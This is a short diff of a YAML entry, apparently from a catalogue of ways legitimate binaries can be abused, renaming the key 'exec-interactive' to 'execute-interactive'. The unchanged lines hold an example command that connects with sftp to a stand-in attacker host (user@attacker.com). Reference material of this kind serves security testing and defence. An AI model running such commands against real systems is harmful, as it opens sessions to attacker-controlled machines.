@@ -1,6 +1,6 @@
 ---
 functions:
-  exec-interactive:
+  execute-interactive:
     - code: |
         HOST=user@attacker.com
         sftp $HOST
